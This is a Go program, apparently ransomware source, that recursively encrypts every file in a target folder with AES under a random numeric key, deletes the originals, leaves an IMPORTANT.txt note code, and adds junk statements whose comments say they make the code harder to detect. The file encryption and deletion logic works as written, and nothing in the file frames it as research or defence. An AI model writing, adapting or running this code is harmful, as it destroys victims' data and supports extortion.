package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	cr "crypto/rand"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"math/rand"
	"time"
)

func confuseEveryone() {
	rand.Seed(time.Now().UnixNano())

	const maxJunkLines = 20
	const maxObfuscationLines = 10
	const maxIfStatements = 5
	const maxWhileLoops = 2

	for i := 0; i < rand.Intn(maxJunkLines); i++ {
		// Add random junk lines here for code obfuscation
		_ = "Lorem ipsum dolor sit amet, consectetur adipiscing elit"
		_ = "Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas"
		_ = "In hac habitasse platea dictumst. Curabitur non nulla sit amet nisl tempus convallis quis ac lectus"
		_ = "Nulla porttitor accumsan tincidunt. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae"
		_ = "Donec velit neque, auctor sit amet aliquam vel, ullamcorper sit amet ligula"
	}

	for i := 0; i < rand.Intn(maxIfStatements); i++ {
		// Add random if statements with confusing conditions
		if rand.Intn(2) == 0 {
			_ = "if true || false && !true { /* more confusion */ }"
		} else {
			_ = "if 1+1 == 3 || len(\"misdirection\") < 5 { /* more confusion */ }"
		}
	}

	for i := 0; i < rand.Intn(maxWhileLoops); i++ {
		// Add random while loops with confusing conditions
		_ = "for rand.Intn(10) > 5 { /* more confusion */ }"
	}

	for i := 0; i < rand.Intn(maxObfuscationLines); i++ {
		// Add obfuscation techniques here to make it harder to detect
		_ = "Lorem ipsum dolor sit amet, consectetur adipiscing elit"
		_ = "Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas"
		_ = "In hac habitasse platea dictumst. Curabitur non nulla sit amet nisl tempus convallis quis ac lectus"
		_ = "Nulla porttitor accumsan tincidunt. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae"
		_ = "Donec velit neque, auctor sit amet aliquam vel, ullamcorper sit amet ligula"
	}
}

func scrambleFile(filePath, secretCode string) error {
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		return err
	}

	encryptionKey := []byte(secretCode)
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return err
	}

	scrambledContent := make([]byte, aes.BlockSize+len(fileContent))
	iv := scrambledContent[:aes.BlockSize]

	if _, err := io.ReadFull(cr.Reader, iv); err != nil {
		return err
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(scrambledContent[aes.BlockSize:], fileContent)

	encryptedFilePath := filePath + ".encrypted"
	err = writeToFile(string(scrambledContent), encryptedFilePath)
	if err != nil {
		return err
	}

	err = os.Remove(filePath)
	if err != nil {
		return err
	}

	return nil
}

func scrambleFilesInFolderRecursive(folderPath, secretCode string) error {
	files, err := ioutil.ReadDir(folderPath)
	if err != nil {
		return err
	}

	for _, file := range files {
		filePath := filepath.Join(folderPath, file.Name())

		if file.IsDir() {
			err := scrambleFilesInFolderRecursive(filePath, secretCode)
			if err != nil {
				return err
			}
			continue
		}

		err := scrambleFile(filePath, secretCode)
		if err != nil {
			return err
		}
	}

	return nil
}

func readline() string {
	bio := bufio.NewReader(os.Stdin)
	line, _, err := bio.ReadLine()
	if err != nil {
		// Handle error
	}
	return string(line)
}

func writeToFile(data, file string) error {
	return ioutil.WriteFile(file, []byte(data), 0777)
}

func readFromFile(file string) ([]byte, error) {
	return ioutil.ReadFile(file)
}

func generateRandomString(length int) string {
	rand.Seed(time.Now().UnixNano())

	const charset = "0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func cleanUpFiles(folderPath string) error {
	files, err := ioutil.ReadDir(folderPath)
	if err != nil {
		return err
	}

	for _, file := range files {
		filePath := filepath.Join(folderPath, file.Name())

		if file.IsDir() || strings.HasSuffix(file.Name(), ".encrypted") {
			continue
		}

		err := os.Remove(filePath)
		if err != nil {
			// Handle error
		}
	}

	return nil
}

func main() {
	confuseEveryone()
	if len(os.Args) < 2 {
		os.Exit(1)
	}

	folderPath := os.Args[1]
	confuseEveryone()

	code := generateRandomString(16)

	userCode := generateRandomString(9)
	writeToFile(userCode, "IMPORTANT.txt")
	writeToFile("DecryptionCode: " + code + "\nUserCode: " + userCode, "output.txt")
	confuseEveryone()

	err := scrambleFilesInFolderRecursive(folderPath, code)
	if err != nil {
		// Handle error
		return
	}

	confuseEveryone()
}
